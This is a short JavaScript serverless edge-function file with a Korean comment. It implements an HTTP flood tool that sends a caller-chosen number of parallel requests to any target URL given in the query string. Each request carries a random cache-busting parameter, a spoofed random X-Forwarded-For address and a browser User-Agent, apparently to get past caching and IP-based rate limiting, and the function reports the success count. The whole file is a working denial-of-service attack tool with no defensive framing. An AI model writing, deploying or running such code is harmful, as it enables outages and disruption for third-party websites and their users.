export const config = { runtime: 'edge' };

export default async function handler(req) {
    const url = new URL(req.url);
    const target = url.searchParams.get('target');
    const count = parseInt(url.searchParams.get('count') || '100');
    
    if (!target) {
        return new Response("Missing target", { status: 400 });
    }
    
    // 병렬 요청
    const promises = [];
    for (let i = 0; i < count; i++) {
        const randUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
        promises.push(
            fetch(randUrl, {
                headers: {
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                cache: 'no-store'
            }).catch(() => null)
        );
    }
    
    const results = await Promise.allSettled(promises);
    const success = results.filter(r => r.status === 'fulfilled' && r.value?.ok !== false).length;
    
    return new Response(`✅ Sent ${count} requests to ${target}\n✅ Successful: ${success}\n✅ Failed: ${count - success}`);
}
